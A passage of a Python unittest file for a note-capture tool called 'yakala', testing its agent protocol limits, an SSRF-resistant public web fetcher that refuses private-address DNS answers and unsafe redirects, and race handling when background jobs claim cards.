        spawned.assert_not_called()
        self.assertEqual(code, 0)
        self.assertTrue(rows[-1]['result']['isError'])

    def test_protocol_oversized_line_closes_without_running_a_tool(self):
        outgoing = io.StringIO()
        with patch.object(sys, 'stdin', io.StringIO('x' * (1024 * 1024 + 1))), patch.object(sys, 'stdout', outgoing), \
                patch.object(yakala, '_agent_tool_call') as call:
            self.assertEqual(yakala._agent_mcp_main(self.vault, self.state, self.job['id']), 1)
        call.assert_not_called()
        self.assertEqual(json.loads(outgoing.getvalue())['error']['code'], -32700)


class FakeAgentResponse:
    def __init__(self, body=b'hello', status=200, headers=None):
        self.body, self.status, self.headers, self.closed = io.BytesIO(body), status, headers or {}, False

    def getheader(self, name, default=None):
        return self.headers.get(name, default)

    def read1(self, limit):
        return self.body.read(limit)

    def close(self):
        self.closed = True


class AgentBridgeNetworkTest(unittest.TestCase):
    def run_get(self, responses, url='https://example.com/page', answers=None, **kwargs):
        sockets, requests, tls_hosts = [], [], []

        class FakeSocket:
            def __init__(self, family, kind):
                self.family, self.kind, self.endpoint, self.closed, self.timeouts = family, kind, None, False, []
                sockets.append(self)

            def settimeout(self, value):
                self.timeouts.append(value)

            def connect(self, endpoint):
                self.endpoint = endpoint

            def close(self):
                self.closed = True

        class FakeHTTP:
            def __init__(self, host, port, timeout):
                self.host, self.port, self.timeout, self.sock = host, port, timeout, None

            def request(self, method, path, headers):
                self.connect()
                requests.append({'method': method, 'path': path, 'headers': headers, 'host': self.host})

            def getresponse(self):
                return responses.pop(0)

            def close(self):
                if self.sock:
                    self.sock.close()

        def tls_wrap(channel, server_hostname):
            tls_hosts.append(server_hostname)
            return channel

        with patch('http.client.HTTPConnection', FakeHTTP), patch('socket.socket', FakeSocket), \
                patch('socket.getaddrinfo', return_value=answers or [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ('93.184.216.34', 443))]), \
                patch('ssl.create_default_context', return_value=types.SimpleNamespace(wrap_socket=tls_wrap)):
            result = yakala._agent_public_get(url, **kwargs)
        return result, sockets, requests, tls_hosts

    def test_socket_is_pinned_and_tls_still_checks_hostname(self):
        response = FakeAgentResponse(headers={'Content-Type': 'text/plain'})
        result, sockets, requests, tls = self.run_get([response])
        self.assertEqual(result['body'], b'hello')
        self.assertEqual(sockets[0].endpoint, ('93.184.216.34', 443))
        self.assertEqual(tls, ['example.com'])
        self.assertEqual(requests[0]['method'], 'GET')
        self.assertNotIn('Authorization', requests[0]['headers'])
        self.assertNotIn('Cookie', requests[0]['headers'])
        self.assertTrue(sockets[0].closed)
        self.assertTrue(response.closed)

    def test_mixed_private_dns_answer_never_connects(self):
        answers = [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ('93.184.216.34', 443)),
                   (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('127.0.0.1', 443))]
        with patch('socket.getaddrinfo', return_value=answers), patch('socket.socket') as channel:
            with self.assertRaises(ValueError):
                yakala._agent_public_get('https://example.com/x')
        channel.assert_not_called()

    def test_private_redirect_and_https_downgrade_are_refused(self):
        for target in ('https://127.0.0.1/private', 'http://example.com/insecure'):
            response = FakeAgentResponse(status=302, headers={'Location': target})
            with self.assertRaises(ValueError):
                self.run_get([response])
            self.assertTrue(response.closed)

    def test_each_public_redirect_uses_fresh_validated_dns(self):
        first = FakeAgentResponse(status=302, headers={'Location': 'https://cdn.example.com/song'})
        final = FakeAgentResponse(body=b'final')
        result, sockets, requests, tls = self.run_get([first, final])
        self.assertEqual(result['url'], 'https://cdn.example.com/song')
        self.assertEqual(tls, ['example.com', 'cdn.example.com'])
        self.assertEqual(len(sockets), 2)
        self.assertTrue(all(item.closed for item in sockets))

    def test_oversized_and_compressed_response_are_refused(self):
        for response in (FakeAgentResponse(body=b'123456'),
                         FakeAgentResponse(headers={'Content-Length': '100'}),
                         FakeAgentResponse(headers={'Content-Encoding': 'gzip'})):
            with self.assertRaises(ValueError):
                self.run_get([response], byte_limit=5)
            self.assertTrue(response.closed)

    def test_fetch_extracts_exact_links_and_discards_script_source(self):
        html = b'<html><title>A song</title><script>delete everything</script><p>Music by A.</p><a href="/song.mp3">Download</a></html>'
        with patch.object(yakala, '_agent_public_get', return_value={'url': 'https://example.com/page', 'body': html,
                                                                  'content_type': 'text/html; charset=utf-8'}):
            result = yakala._agent_fetch_source('https://example.com/page')
        self.assertEqual(result['title'], 'A song')
        self.assertNotIn('delete everything', result['text'])
        self.assertEqual(result['links'], ['https://example.com/song.mp3'])
        self.assertEqual(result['source_trust'], 'untrusted')


class AgentManualProcessRaceTest(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix='yakala-manual-agent-race-')
        self.addCleanup(temporary.cleanup)
        self.vault = Path(temporary.name) / 'Örnek Vault'
        self.state = Path(temporary.name) / 'state'
        self.vault.mkdir()
        result = yakala.capture(self.vault, text='Original source text', why='Initial reason', state=self.state)
        self.card_id, self.card_path = result['id'], self.vault / result['path']
        self.raw_path = self.card_path.parent / '.ham' / (self.card_id + '.md')

    def claim(self):
        meta, body = yakala.read_card(self.card_path)
        meta.update(durum='ajanda', ajan_isi='8ed4d7b8-01bf-49fb-8d5b-b7e1eebc8ac6', ajan_asama='sirada')
        yakala.write_card(self.card_path, meta, body + '\n\n## New reason\nA newer captured request.\n')

    def test_claim_between_target_listing_and_snapshot_is_not_erased(self):
        original_find = yakala.find_card

        def claim_after_listing(vault, card_id, state=None):
            old_snapshot = original_find(vault, card_id, state)
            self.claim()
            return old_snapshot

        with patch.object(yakala, 'find_card', side_effect=claim_after_listing), \
                patch.object(yakala, 'tools', return_value={}), \
                patch.object(yakala, 'extract', return_value=('New extracted text', 'test', None)) as extract:
            result = yakala.process(self.vault, [self.card_id], state=self.state)
        meta, body = yakala.read_card(self.card_path)
        self.assertEqual(meta['durum'], 'ajanda')
        self.assertEqual(meta['ajan_isi'], '8ed4d7b8-01bf-49fb-8d5b-b7e1eebc8ac6')
        self.assertIn('A newer captured request.', body)
        self.assertEqual(result['kartlar'][0]['durum'], 'ajanda')
        extract.assert_not_called()
        self.assertFalse(self.raw_path.exists())

    def test_claim_during_extraction_keeps_both_card_and_existing_raw_source(self):
        self.raw_path.parent.mkdir(parents=True)
        original_raw = b'Existing source already available to the newly claimed background job.\n'
        self.raw_path.write_bytes(original_raw)

        def claim_during_extract(*args, **kwargs):
            self.claim()
            return 'A late extraction that may no longer commit', 'test', None

        with patch.object(yakala, 'tools', return_value={}), \
                patch.object(yakala, 'extract', side_effect=claim_during_extract):
            result = yakala.process(self.vault, [self.card_id], state=self.state)
        meta, body = yakala.read_card(self.card_path)
        self.assertEqual(meta['durum'], 'ajanda')
        self.assertEqual(meta['ajan_isi'], '8ed4d7b8-01bf-49fb-8d5b-b7e1eebc8ac6')
        self.assertIn('A newer captured request.', body)
        self.assertEqual(self.raw_path.read_bytes(), original_raw)
        self.assertEqual(result['kartlar'][0]['durum'], 'hata')
        self.assertIn('degisti', result['kartlar'][0]['not'])

    def test_unchanged_source_still_commits_raw_text_and_card(self):
        with patch.object(yakala, 'tools', return_value={}), \
                patch.object(yakala, 'extract', return_value=('Expected extracted source', 'test', None)):
            result = yakala.process(self.vault, [self.card_id], state=self.state)
        meta, _body = yakala.read_card(self.card_path)
        self.assertEqual(meta['durum'], 'cikarildi')
        self.assertEqual(result['kartlar'][0]['durum'], 'cikarildi')
        self.assertIn('Expected extracted source', self.raw_path.read_text(encoding='utf-8'))


if __name__ == '__main__':
    unittest.main()
